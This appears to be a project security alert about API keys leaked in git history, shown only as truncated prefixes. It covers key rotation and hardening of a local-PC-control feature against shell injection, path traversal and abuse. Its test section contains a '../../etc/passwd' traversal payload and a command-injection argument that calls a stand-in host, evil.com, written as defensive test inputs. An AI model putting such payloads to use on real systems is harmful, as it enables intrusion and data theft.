# CRITICAL SECURITY ALERT

**Date**: 2025-10-29
**Status**: URGENT ACTION REQUIRED

## Exposed API Keys in Git History

During a merge conflict resolution, the following API keys were exposed in the git diff:

### Keys That MUST Be Revoked Immediately:

1. **Anthropic API Key**
   - Pattern: `sk-ant-api03-UiHF...`
   - Action: Revoke at https://console.anthropic.com/
   - Impact: Full access to Claude API under your account

2. **OpenAI API Key**
   - Pattern: `sk-proj-R0vi...`
   - Action: Revoke at https://platform.openai.com/api-keys
   - Impact: Full access to GPT models, potential billing abuse

3. **Google API Key**
   - Pattern: `AIza...`
   - Action: Revoke at https://console.cloud.google.com/apis/credentials
   - Impact: Access to Google AI services

4. **Encryption Key**
   - A production encryption key was exposed
   - Action: Generate new key and rotate immediately
   - Impact: All encrypted data may be compromised

## Immediate Actions Required

### 1. Revoke All Exposed Keys (Within 24 hours)
```bash
# Visit each provider's console and revoke the keys listed above
```

### 2. Generate New Keys
```bash
# Generate new encryption keys
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"

# Update .env with new keys (NEVER commit .env to git)
```

### 3. Rotate Credentials in Production
- Update all production environments with new keys
- Restart services to pick up new credentials
- Verify services are functional with new keys

### 4. Clean Git History (Optional but recommended)
```bash
# Use git-filter-repo or BFG Repo-Cleaner to remove sensitive data
# WARNING: This rewrites git history and requires force push
git filter-repo --path .env.example --invert-paths
```

## Security Improvements Implemented

The following critical security issues have been fixed in this commit:

### MCP Connector Security Enhancements

1. **Shell Injection Prevention**
   - Changed from `exec()` to `execFile()` to prevent command injection
   - Removed shell interpolation and string concatenation
   - Added strict input validation and length limits

2. **Path Traversal Protection**
   - Implemented `path.resolve()` and `path.normalize()` for all file paths
   - Added allowlist validation that checks resolved absolute paths
   - Prevents `../../etc/passwd` style attacks

3. **Constant-Time API Key Comparison**
   - Replaced string comparison with `crypto.timingSafeEqual()`
   - Prevents timing-based attacks to guess API keys

4. **Rate Limiting**
   - Implemented 30 requests/minute per user across all MCP actions
   - In-memory rate limiting with automatic cleanup
   - Prevents abuse and DoS attempts

5. **Async File Operations**
   - Converted from synchronous to asynchronous file I/O
   - Prevents event loop blocking on large files
   - Better performance under load

6. **File Size Limits**
   - Maximum 10MB file size for read/write operations
   - Content size validation before processing
   - Output truncation to prevent memory exhaustion

7. **Enhanced Audit Logging**
   - Comprehensive redaction of sensitive inputs
   - Automatic detection of sensitive field names (password, token, secret, etc.)
   - Non-blocking audit log creation
   - Proper HTTP status codes (401, 429, 400, 500)

8. **Allowlist Caching**
   - Environment variable parsing cached for 60 seconds
   - Reduces CPU overhead on every request
   - TTL-based cache invalidation

## MCP Security Configuration

The MCP (Local PC Control) feature is **disabled by default** and requires explicit configuration:

```bash
# .env
MCP_ENABLE=false  # Must be true to enable
MCP_ACCESS_TOKEN=<generate-strong-random-token>  # Required
MCP_ALLOWED_COMMANDS=git,node,npm,code  # Comma-separated allowlist
MCP_ALLOWED_DIRS=/path/to/project  # Only these directories accessible
MCP_ALLOWED_APPS=code,notepad  # Only these apps can be launched
```

### Security Best Practices for MCP

1. **Keep MCP disabled unless absolutely necessary**
2. **Use strong, randomly generated access tokens**
3. **Limit allowed commands to minimum required set**
4. **Restrict allowed directories to project workspace only**
5. **Monitor audit logs for suspicious activity**
6. **Set up alerts for failed authentication attempts**

## Testing the Fixes

Run these security tests to verify the fixes:

```bash
# Test path traversal protection
curl -X POST /api/integration/execute \
  -d '{"integrationId":"mcp-local","actionName":"fs.read","actionInput":{"filePath":"../../etc/passwd"}}'
# Should return: "Path not allowed"

# Test command injection
curl -X POST /api/integration/execute \
  -d '{"integrationId":"mcp-local","actionName":"shell.exec","actionInput":{"command":"git","args":["&& curl evil.com"]}}'
# Should execute safely with execFile (no shell interpolation)

# Test rate limiting
for i in {1..35}; do
  curl -X POST /api/integration/execute ...
done
# Should fail after 30 requests with "Rate limit exceeded"
```

## Monitoring and Alerts

Set up monitoring for:

1. **Failed authentication attempts** (MCP + OAuth)
2. **Rate limit violations**
3. **Suspicious file access patterns** (e.g., /etc/, C:\Windows\)
4. **Large file operations** (approaching 10MB limit)
5. **High error rates** in audit logs

## Additional Security Recommendations

### High Priority
1. Implement database-backed rate limiting for distributed deployments
2. Add IP-based rate limiting at the API gateway level
3. Set up automated key rotation schedules
4. Enable 2FA on all AI provider accounts
5. Use secrets management service (AWS Secrets Manager, HashiCorp Vault)

### Medium Priority
6. Implement symlink detection in file operations
7. Add checksum verification for file writes
8. Set up intrusion detection for unusual patterns
9. Enable comprehensive security logging (SIEM integration)
10. Regular security audits and penetration testing

### Low Priority
11. Add support for file type restrictions
12. Implement content scanning for malware
13. Add digital signatures for MCP operations
14. Set up anomaly detection using ML

## Contact

If you have questions about these security fixes or need assistance with key rotation:

- Review the commit history for implementation details
- Check audit logs for any suspicious activity during the exposure window
- Consider this a security incident and follow your incident response procedures

## References

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- CWE-78 (Command Injection): https://cwe.mitre.org/data/definitions/78.html
- CWE-22 (Path Traversal): https://cwe.mitre.org/data/definitions/22.html
- CWE-208 (Timing Attack): https://cwe.mitre.org/data/definitions/208.html
